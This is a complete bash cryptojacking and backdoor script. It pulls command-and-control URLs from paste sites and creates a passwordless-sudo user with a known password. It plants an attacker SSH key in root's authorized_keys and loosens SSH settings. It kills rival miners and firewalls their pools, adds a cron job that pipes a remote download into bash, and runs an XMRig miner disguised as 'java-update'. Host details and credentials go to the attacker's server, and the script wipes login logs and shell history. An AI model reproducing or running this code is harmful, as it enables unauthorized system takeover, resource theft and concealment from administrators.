#!/bin/bash
# me - https://pastebin.com/raw/HJLMF7Es
# http://removeables.000webhostapp.com/images/title.png - https://pastebin.com/raw/uT4tzRKG
# https://removeables.000webhostapp.com/contact.php?xdfse - https://pastebin.com/raw/AHmiRqMU
#
if [ -f "/var/tmp/.deploycache/deploy/java-update" ]; then
    # Only launch new instance if it's been over 24 hrs
    lastModificationSeconds=$(date +%s -r /var/tmp/.deploycache/deploy/java-update)
    currentSeconds=$(date +%s)
    elapsedSeconds=$((currentSeconds - lastModificationSeconds))
    if [ $elapsedSeconds -lt 84600 ];then
        echo "No changes,as it's not been up to an hour yet";
        # echo "No changes,as it's not been up to an hour yet";
        exit;
    fi
fi


tmp=
trap 'rm -rf "$tmp"' EXIT INT TERM HUP
tmp=$(mktemp -d)
export GNUPGHOME="$tmp"
gpg --import <<EOF
-----BEGIN PGP PUBLIC KEY BLOCK-----

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
rkALpJ+joCBzA40rI2YufJ6jWcQyrH4wvtFEfMQ=
=d4sT
-----END PGP PUBLIC KEY BLOCK-----
EOF

# gpg  -e  --always-trust -r admindaemon tst

set +e

#######################
# ENCRYPTION OPENSSL
#######################
# Key

# check for openssl
openssl=$(which openssl | grep openssl)
if [[ $openssl =~ .*openssl.*$ ]]; then
    installed=true
else
    apt-get update
    apt update
    apt-get install systemd -y;
    apt install systemd -y;
    yum check-update;
    yum install systemd -y;
    apk add systemd -y;
fi

#######################
# ENCRYPTION GPG
#######################
# Key

# check for gpg
gpg=$(which gpg | grep gpg)
if [[ $gpg =~ .*gpg.*$ ]]; then
    installed=true
else
    apt-get update
    apt update
    apt-get install gnupg -y;
    apt install gnupg -y;
    yum check-update;
    yum install gnupg -y;
    apk update;
    apk add  gnupg -y;
fi




# Public Key
USERPUBKEY="LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FDWWJVbWV0RVRES0J5d0ZoU0FvVjEwMWo3UQpPNDlTRHVqL2VVOGdHV0FDOWRuSUViYXpDN1gveXkycDZWc2hONW14MzQ2Y2JrOU5tNDAzZzhqWlh5Zmt0eEEvCm9Ndkx3VVpXcEdLYkZOUkdDYUMzVGloenRwL1MxVVZRbHl4a1VwbTA2TjNVY2JKdjhsVnFFWVhyWTlJZ1NXOWUKNHg2bjhqc1czYXhLSk5UUk5RSURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQo="
USERPUBKEYFILE=/tmp/$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 12 | head -n 1).pub
echo $USERPUBKEY | base64 -d > $USERPUBKEYFILE


#######################
# CURL, WGET, GET TEST ################################## ADD busybox !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
#######################
ip=$(curl "https://api.ipify.org/")  || true
if [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
    getfile="curl -L -s "
    getfile2="curl -L -o "
    #vmtest=$(curl http://jumpoingstyhujkial.com)
    postcommand="curl -L -s -F "
else
    ip=$(wget -qO - "https://api.ipify.org/")
    if [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        getfile="wget -qO- "
        getfile2="wget -qO "
        #vmtest=$(wget -O - http://jumpoingstyhujkial.com)
        postcommand="wget -qO- --post-data="
    fi
fi


#######################
#VM TEST
#######################
#if [[ $vmtest =~ .*Could not resolve host.* ]]; then
#fi
#if [[ $vmtest =~ .*unable to resolve host address.* ]]; then
#fi

# try diff urls till it works
tryurls()
{
    urltoget="0"
    arr=("$@")
    for i in "${arr[@]}";do
        geturl $i $1
        echo "---------------------------------- urltoget = ${urltoget}"
        if [ $urltoget != "0" ]; then
            #echo "breaking"
            break
        fi
    done

}


# get URL
geturl()
{
    urltoget="0"
    getsecuretext $1
    echo "--------- getsecuretext AFTER GETTING TEXT"
    echo $decodedtext
    if [ $decodedtext == "0" ]; then
        # try valid server + files url (hardcoded)
        getvalidServer
        if [ $validserver == "0" ]; then
            # no valid url
            urltoget="0"
        else
            urltoget="${validserver}/"$2
        fi
    else
        # text is valid, get url
        urltoget=$decodedtext
    fi
}

#get server from pastebin or use defaults
getsecuretext()
{
    decodedtext="0"


    text=$(eval $getfile $1)

#    echo "text is ${text}"

    # decode text
    decodedtext=$(echo $text | base64 -d | openssl rsautl -inkey $USERPUBKEYFILE -pubin)


    # if fake server, or not valid url, delete and exit
    if [[ -z "$decodedtext" ]] || [[ $decodedtext =~ .*RSA.*$ ]]; then
    #if [[ $decodedtext =~ .*RSA operation error.*$ ]]; then
        decodedtext="0"
        #rm -rf "${self}"
        #exit
    fi
}

getvalidServer()
{
    validserver="0"
    # try pastebin for update
    # else try harcoded urls : foreach
        # get ID flag, then decrypt and confirm decodedtext
        # get ID flag, then decrypt and confirm decodedtext
}

# decryptfile
# loader https://pastebin.com/MpQzgR8C
#######################
# Variables ####################### -- ALTERNATIVE FOR PASTEBIN !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
#######################
self="/tmp/img.jpg"
xmrport="8080"
paths=("/var/tmp" "/tmp")
fileslist=("https://pastebin.com/raw/zXypiwSX") # OLiWhhP3blZAqkobf1t7EPRGPWh/UsiBHQ4PM2eLx9oU5A5PbRH6avMgmBxGMBxF72vv6T9lJ559Ww7clwGspihL0XiCjotLDhgraChsP/dRZHEhTlklTNHfGXYQ1yY9m+XLI5ASLPgMUBaz85C8o+aM3KR3vBhM1uOhskXZedk=
notifyurllist=("https://pastebin.com/raw/ALSkhGya") # H1HWnkvyHcAIOXUyV4cH8ooHiex6aiNcsvslOV3snvYZ8mJnX9JBqC2OoRmPVNgfuqm0VG0kQdta1pUwm1Y0y9GtJ1OTGr3OgQv+IwH7fPSHYF1edULg/6O+HKl4xvrMzgqTCDK5XrSfupFtkgX6q2WCj6N3hOQOW1YOhh3zPfM=
setupurllist=("https://pastebin.com/raw/nuvh5GmA", "http://pasted.co/f80773f4/fullscreen.php?hash=1d236048efefcf6d2f57d554491bd9d9&toolbar=true&linenum=false", "https://paste.ee/r/sEy46")
#ak2a7UkUsfH4+p6xYDDPVIRtcY/2PuTkjiG6Q1ZQn3ezRyqsB37t951BDZ89HWJoo+h1ZJJrGXGF8CRpv2CpuX28dnOWf1QdPkIu3J5d0envkWKRkMf2KGz2qkX+YEBcaX7oUW23t17SXpvBJcUL0shPo4g99el5xs127MOOVq8=
#setupurllist=("https://pastebin.com/raw/vpdqsikm")
workdir=""
product="doc"
#setupurl="https://pastebin.com/raw/HJLMF7Es"
lockfile="/tmp/java2210.lock"
myhostname=$(hostname)
architecture=$(uname -m)
myip=$(eval $getfile http://whatismyip.akamai.com/)
cpumodel1=$(lscpu | grep "Model ")
cpumodel2=$(echo "${cpumodel1//Model name\:/}")
cpumodel3=$(echo "${cpumodel2//  /}")
cpumodel4=$(echo "${cpumodel3// /_}")
cpumodel=$(echo "${cpumodel4//(|)/}")
cpumodel=$(echo "${cpumodel//\(/-}")
cpumodel=$(echo "${cpumodel//\)/-}")
cpumodel=$(echo "${cpumodel//-/_}")
cpucount=$(nproc)
datenow=`date '+%Y-%m-%d-time-%H-%M-%S'`
iamuser=$(whoami)
myidstring=$product-$myip-$iamuser-$myhostname-$architecture-$cpumodel-c$cpucount_procs-$datenow
myconfigname=$product-$iamuser-$architecture-$cpumodel-c$cpucount_procs-$datenow
# userpassword=$product-$myip-$hostname-$architecture-c$cpucount
# doc-101.132.151.130-pcloud01-x86_64-Intel-R-_Xeon-R-_Platinum_8163_CPU_@_2.50GHz-c-2019-01-22-20:30:10

userpassword=$myip-yuguiyiuk898
#files=$(eval $getfile "https://pastebin.com/raw/uT4tzRKG")
#setupurl=$(eval $getfile "https://pastebin.com/raw/HJLMF7Es")
#notifyurl=$(eval $getfile "https://pastebin.com/raw/AHmiRqMU")=${myidstring}




# get files URL
tryurls "${fileslist[@]}" "/images/title.png"
files=$urltoget
echo " **************** files=${files}"

# get setupurl URL
tryurls "${setupurllist[@]}" "/images/img.jpg"
setupurl=$urltoget
echo " **************** setupurl=${setupurl}"
#echo setupurl=${setupurl}

# get notifyurl URL
tryurls "${notifyurllist[@]}" "/contact.php?xdfse"
notifyurl="${urltoget}=${myidstring}"
echo " **************** notifyurl=${notifyurl}"


# notify function
notify ()
{
    #enctext=$(echo "---${myidstring}--->$1" | openssl rsautl -encrypt -inkey $USERPUBKEYFILE -pubin | base64)
    # enctext=$(echo "${myidstring}-->$1" | gpg  -e  --always-trust -r admindaemon | base64)
    enctext=$(echo "-- $1"| base64)
    #echo "Hello---kjniwnfwwef234r@423RFe}--->Hi there " | gpg  -e  --always-trust -r admindaemon | base64 > o.gpg
    #gpg  -e  --always-trust -r admindaemon tst
    eval $postcommand "\"msg=${enctext}\"" "\"${notifyurl}\"" > /dev/null 2>&1
}

#######################
# RSA and NEW USER
#######################
# check if root or sudo
rootperms=$(sudo -l | grep ALL)  || true
sudoguy="    (ALL) NOPASSWD: ALL"
rootuser=false
sudouser=false
if [ -w /root ]; then
    rootuser=true
fi

if [ "$rootperms" == "$sudoguy" ]; then
    sudouser=true
fi

yum install gnupg -y  || sudo apt-get install gnupg2 -y  || apt-get install gnupg2 -y || apk add  gnupg -y || true

# create user with pass
# notify "Setting redo cron job for self" ???

notify " - Adding new user - admindaemon:${userpassword}"
sudo adduser admindaemon  --gecos  "First Last,RoomNumber,WorkPhone,HomePhone" --disabled-password  ||  adduser admindaemon  --gecos  "First Last,RoomNumber,WorkPhone,HomePhone" --disabled-password  || true
sudo echo "admindaemon:"$userpassword | sudo chpasswd || echo "admindaemon:"$userpassword | sudo chpasswd || true
sudo echo "admindaemon ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoerssudo || echo "admindaemon ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoerssudo || true

# put  rsa login for user
# su - admindaemon -c "ssh-keygen -q -t rsa -f ~/.ssh/id_rsa -N ''" java-update
# cp key to home direc of new user
su - admindaemon -c "mkdir ~/.ssh" || true
su - admindaemon -c "cat ${USERPUBKEYFILE} > ~/.ssh/authorized_keys" || true
su - admindaemon -c "chmod 600 ~/.ssh/authorized_keys"  || true


doconfig ()
{
    if cat /etc/ssh/sshd_config | grep $1 | grep yes | grep -v "#"; then
        echo $1 - ok ;
    else
        echo "adding"
        echo "${1} yes" >> /etc/ssh/sshd_config
        echo "echo \"${1} yes\" >> /etc/ssh/sshd_config"
    fi
}

doconfig PermitRootLogin
doconfig RSAAuthentication
doconfig PubkeyAuthentication
/etc/init.d/sshd restart
keys=$(cat /home/admindaemon/.ssh/authorized_keys) || true
notify "Auth keys - $keys"


#  export PATH= $PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbinecho "*/10 * * * * curl -fsSL http://blah.com | sh" > /var/spool/cron/root mkdir -p /var/spool/cron/crontabs echo "*/10 * * * * curl -fsSL http://blah2.com | sh" > /var/spool/cron/crontabs/root if [ ! -f "/root/.ssh/iuygiuyu" ]; then mkdir -p ~/.ssh rm -f ~/.ssh/authorized_keys* echo "ssh-rsa AAAA****** root" > ~/.ssh/iuygiuyu echo "PermitRootLogin yes" >> /etc/ssh/sshd_config echo "RSAAuthentication yes" >> /etc/ssh/sshd_config echo "PubkeyAuthentication yes" >> /etc/ssh/sshd_config echo "AuthorizedKeysFile .ssh/authorized_keys .ssh/authorized_keys2 .ssh/iuygiuyu" >> /etc/ssh/sshd_config /etc/init.d/sshd restart fi if [ ! -f "/etc/init.d/ntp" ]; then if [ ! -f "/etc/systemd/system/ntp.service" ]; then mkdir -p /opt curl -fsSL http://blah3.com_`uname -m` -o /opt/iuygiuyu && chmod +x /opt/iuygiuyu && /opt/iuygiuyu -Install fi fi /etc/init.d/ntp start ps auxf|grep -v grep|grep "/usr/bin/cron" |awk '{print $2}' |xargs kill - 9 ps auxf|grep -v grep|grep "/opt/cron" |awk '{print $2}' |xargs kill - 9

# allow password auth
sed -i "s/PasswordAuthentication no/PasswordAuthentication yes/g" /etc/ssh/sshd_config || true

if [ -f /etc/init.d/ssh ]; then
    /etc/init.d/ssh restart  || true
fi

if [ -f /etc/init.d/sshd ]; then
    /etc/init.d/sshd restart  || true
fi

if [ -f /etc/rc.d/sshd ]; then
    /etc/rc.d/sshd restart  || true
fi


# put rsa login for root
mkdir /root/.ssh  || true
sudo chattr -i /root/.ssh/authorized_keys  || true
sudo chmod 700 /root/.ssh/authorized_keys  || true
sudo cat $USERPUBKEYFILE >> /root/.ssh/authorized_keys  || true
sudo chmod 600 /root/.ssh/authorized_keys   || true
sudo chattr +i /root/.ssh/authorized_keys  || true

# etc/rc.local/XXXXX / bashrc /



# notify "  --> LAUNCHING ---- ${myidstring}"


killword ()
{
    ps aux | grep -v grep| grep $1 |awk '{print $2}' xargs kill -9 > /dev/null 2>&1
}

#######################
# KILL COMPETITION
#######################

# KILL any bproc with 99% CPU
#ps aux | grep -vw java-update | awk '{if($3>99.0) print $2}' | while read procid
#do
#kill -9 $procid
#done

# KILL OTHER MINERS
killword "mine."
killword "xmr."
killword "devtools"
killword "monero"
killword "/tmp/"
killword "stratum"
killword "xmrpool"
killword "xiaoyao"
killword "xiaoxue"

killword "mcoin"
killword "xmrig"
killword "cgminer"
killword "miner"
killword "minerd"
killword "stratum"
killword "suppoie"
killword "mirai"
# killword "img.jpg"

pkill -f cryptonight
pkill -f sustes
pkill -f xmrig
pkill -f xmr-stak
pkill -f suppoie

pkill -f bonn.sh
pkill -f conn.sh
pkill -f kworker34
pkill -f kw.sh
pkill -f pro.sh
pkill -f polkitd
pkill -f acpid
pkill -f icb50
pkill -f nopxl
pkill -f irqbalancl
pkill -f minerd
pkill -f i586
pkill -f gddr
pkill -f mstxmr
pkill -f ddg.2011
pkill -f wnTKYg
pkill -f deamon
pkill -f disk_genius
pkill -f sourplum
pkill -f polkitd
pkill -f nanoWatch
pkill -f zigw

pkill -f biosetjenkins
pkill -f Loopback
pkill -f apaceha
pkill -f cryptonight
pkill -f stratum
pkill -f mixnerdx
pkill -f performedl
pkill -f JnKihGjn
pkill -f irqba2anc1
pkill -f irqba5xnc1
pkill -f irqbncl
pkill -f ir29xc1
pkill -f conns
pkill -f irqbalance
pkill -f crypto-pool
pkill -f minexmr
pkill -f XJnRj
pkill -f mgwsl
pkill -f pythno
pkill -f jweri
pkill -f lx26
pkill -f NXLAi
pkill -f Bi5zj
pkill -f askdljlqw
pkill -f minerd
pkill -f minergate
pkill -f Guard.sh
pkill -f ysaydh
pkill -f bonns
pkill -f donns
pkill -f kxjd
pkill -f Duck.s

echo "done killing"
# kill any SUPER CPU PROCESS
# ps -eo pcpu,args --sort=-%cpu | head
# top -bn2 |sed -n '7,25'p -

#######################
# BLOCK ALL MINING POOLS
#######################
iptables -A OUTPUT -p tcp --dport 3333 -j DROP || ufw deny 3333 || true
iptables -A OUTPUT -p tcp --dport 5555 -j DROP || ufw deny 5555 || true
iptables -A OUTPUT -p tcp --dport 7777 -j DROP || ufw deny 7777 || true
iptables -A OUTPUT -p tcp --dport 9999 -j DROP || ufw deny 9999 || true
iptables -A INPUT -s xmr.crypto-pool.fr -j DROP || ufw deny 3333 || true

#######################
# UNBLOCK  MINING POOL PORT FOR SELF
#######################
iptables -A OUTPUT -p tcp --dport $xmrport -j ACCEPT  || ufw allow $xmrport|| true
iptables -A INPUT -p tcp --dport $xmrport -j ACCEPT || true
# Restart iptables
service iptables reload || true
sudo iptables-save -c  > /dev/null 2>&1 || iptables-save -c  > /dev/null 2>&1 || true

echo "done iptables"

#make sure we're only running one instance created in the last 100 secs
if [ -f "$lockfile" ]; then
    lastmodified=$(stat -c %Y $lockfile)
    lastplus=$(($lastmodified + 100))
    now=$(date +%s)
    if [ $lastplus -gt $now ]; then
        # notify " !!!!! Locked file SLEEPING !!!"
        sleep 101s;
        lockfile="${lockfile}1";
    fi
fi

CURPID=$$
echo "my PID = ${CURPID}"

ps aux | grep -v grep|  grep -v $CURPID | grep "img.jpg" |awk '{print $2}' | xargs kill -9 > /dev/null 2>&1

echo "done lockfile check"


#lock
echo 1 > $lockfile
chmod 777 $lockfile
touch $lockfile

echo "done creating lockfile"


for i in ${paths[@]}; do
    if [ -w "${i}" ]; then
        workdir=${i}
        break
    fi
done

echo "workdir = ${workdir}"


# if no writable dir found
if [ -z "$workdir" ]; then
    notify "unwritable"
    exit
fi

# create subdirectory
# [ -d $workdir/.deploycache ] || mkdir $workdir/.deploycache
mkdir $workdir/.deploycache || true
workdir=$workdir/.deploycache
chattr -i -R ${workdir} || true



chmod 777 $workdir


# kill old instances of worker
#if [[ $(ps -ef | grep java-update | grep -v grep | wc -l) != 0 ]]; then
#    killall java-update
#fi

# install cron if not there
sudo apt-get install cron -y ||  apt-get install cron -y ||  yum install cron -y || apk add cron -y || true

# save current crontab to a file
cronfile="${workdir}/.crontab.tmp"
crontab -l > "${cronfile}" || true

# remove old /var/tmp/check-****.sh from cron
###########  REMOVE OTHERS TOO !!!
sed -i '/\/var\/tmp\//d' "${cronfile}"
sed -i '/tmp\//d' "${cronfile}"
sed -i '/img.jpg/d' "${cronfile}"
sed -i '/pastebin/d' "${cronfile}"

# check if we already have cron setup
if ! grep -q "${setupurl}" "${cronfile}"; then

    # setup new cron if needed
    # */5 * * * *
    echo "*/20 * * * * curl -L -s \"${setupurl}\" | sed 's/\r//' | bash" > "${cronfile}"

    # report to hq
    # notify "Cron installed"

fi

crontab "${cronfile}"  || true
rm -f "${cronfile}"

# check if xmrig is where we want it to be - $workdir/deploy
xmrigdir="${workdir}/deploy"
if [ ! -d "${xmrigdir}" ]; then
    echo "if can't find xmrigdir - make new"
    #mkdir "${xmrigdir}"
    #chmod 777 "${xmrigdir}"
fi

download=1
######  ALWAYS DOANLOAD !!
# check if we have executable
if [ ! -f "${xmrigdir}/java-update" ] ||  [ ! -f "${xmrigdir}/config.json" ]; then
    notify "executable not found"
    download=1
else
    notify "old install - executable found"
    # verify config is up to date
       # if not - kill xmrig, update config
fi




# set huge pages
echo 128 > /proc/sys/vm/nr_hugepages || true
sysctl -w vm.nr_hugepages=128 || true

launch=0
if [ $download = 1 ]; then
    # notify "Downloading files"

    # unlock files



    eval $getfile2 "${workdir}/files.tar" "${files}"
    echo $getfile2 "${workdir}/files.tar" "${files}"



    echo "---------------- GET FILES ----------------"
    # echo $getfile "${workdir}/files.tar" "${files}"

    chmod 777 "${workdir}/files.tar"

    if [ ! -f "${workdir}/files.tar" ]; then
        notify "files dl FAILED EXITING"
        # exit
    fi

    notify "Downloaded files OK"
    cd "${workdir}"
    tar -xvf files.tar



    chmod -R 777 "${xmrigdir}"
    #rm -rf "${xmrigdir}/*"
     cd "${xmrigdir}"

    if [ ! -f "java-update" ]; then
        notify "executable not found  FAILED EXITING"
        exit
    fi

    rm -f ../files.tar
    chmod +x java-update

    chattr +i -R ${workdir}  || true

    launch=1
fi

# check if xmrig is runing
if [[ $(ps -ef | grep java-update | grep -v grep | wc -l) = 0 ]]; then
    # if not already runing, launch xmrig with nohup
    # notify "Not currently running - about to start"
    launch=1
fi


# Only launch new instance if it's been over 4 hrs
lastModificationSeconds=$(date +%s -r ${xmrigdir}/java-update)
currentSeconds=$(date +%s)
elapsedSeconds=$((currentSeconds - lastModificationSeconds))
if [ $elapsedSeconds -lt 14400 ];then
    notify " TODO - EXIT HERE - No changes,as it's not been up to 4 hours yet";
    # exit;
fi

if [ $launch = 1 ]; then
    #nohup
    chattr -i -R ${workdir}  || true
    cd "${xmrigdir}"
    chattr -i ${workdir}  || true
    chmod 777 "${xmrigdir}"  || true
    chmod -R 777 *  || true
    chmod 777 config.json  || true

    # stop server
    killword "java-update"

    # set password
    sed -i "s/\"pass\"\:.*,/\"pass\"\:\"${myidstring}:cmwolf@gmx.com\",/"  config.json
    # set log on
    sed -i "s/\"log-file\"\:.*,/\"log-file\"\:\".xlog\",/"  config.json
    # set Ditch color logs
    sed -i "s/\"colors\"\:.*,/\"colors\"\: false,/"  config.json


    # notify "-- Starting Server Diagnostics --"
    nohup ./java-update > out.log 2>&1 &
    # LOOP thrice sleep 2 mins, grep log for h/s, if h/s notify log & ps -aux -b & top -b 1 -> EXIT
    for i in 1 2 3 4 5 6
    do
        echo "waiting for log ........"
        sleep 30s
        if grep -q "H/s" .xlog; then
            break
        fi
    done

    heading=$(head -20 .xlog)
    hashrates=$(cat .xlog | grep H/s | tail -20)
    topcpu=$(top -b -n 1)
    processes=$(ps -aux)
    notify "Server Stats:\r\n------------------\r\n\r\n heading \r\n------------------\r\n\r\n ${heading} \r\n------------------\r\n\r\n hashrates \r\n------------------\r\n\r\n ${hashrates}"
    #\r\n------------------\r\n\r\n topcpu \r\n------------------\r\n\r\n ${topcpu} \r\n------------------\r\n\r\n processes \r\n------------------\r\n\r\n ${processes}
    #echo "Server Stats:\r\n------------------\r\n\r\n heading \r\n------------------\r\n\r\n ${heading} \r\n------------------\r\n\r\n hashrates \r\n------------------\r\n\r\n ${hashrates} \r\n------------------\r\n\r\n topcpu \r\n------------------\r\n\r\n ${topcpu} \r\n------------------\r\n\r\n processes \r\n------------------\r\n\r\n ${processes}"
    #echo "Server Stats:\r\n------------------\r\n\r\n heading \r\n------------------\r\n\r\n ${heading} \r\n------------------\r\n\r\n hashrates \r\n------------------\r\n\r\n ${hashrates} \r\n------------------\r\n\r\n topcpu \r\n------------------\r\n\r\n ${topcpu} \r\n------------------\r\n\r\n processes \r\n------------------\r\n\r\n ${processes}" >> out.log
    # stop server

    # stop server
    # killword "java-update"

    # sed -i "s/\"log-file\"\:.*,/\"log-file\"\: null,/"  config.json
    # start again
    # nohup ./java-update > out.log 2>&1 &
    # delete logs
    # rm -rf .xlog
    # sleep 1m
    # rm -rf config.json
    # chattr +i -R ${workdir}  || true
fi



#echo "------------------ 222 -=-=-=-=-=-=- tar DIREC = ${xmrigdir} -=-=-=-=-=-=- "
#ls -all ${xmrigdir}



# report to hq if xmrig is runing (hashrate) or if glibc not found or if connection refused or elf not found or upload xmrig/nohup log if can't determine the reason
if [[ $(ps -ef | grep java-update | grep -v grep | wc -l) != 0 ]]; then
    notify "SERVER UP all done"
else
    notify "SERVER FAILED UNKONOWN REASON - EXITING"
fi

rm -f "${lockfile}"
rm -rf $USERPUBKEYFILE

rm -f "${self}" || true
echo > /var/spool/mail/root  || true
echo > /var/log/wtmp  || true
echo > /var/log/secure  || true
echo > /root/.bash_history  || true
exit
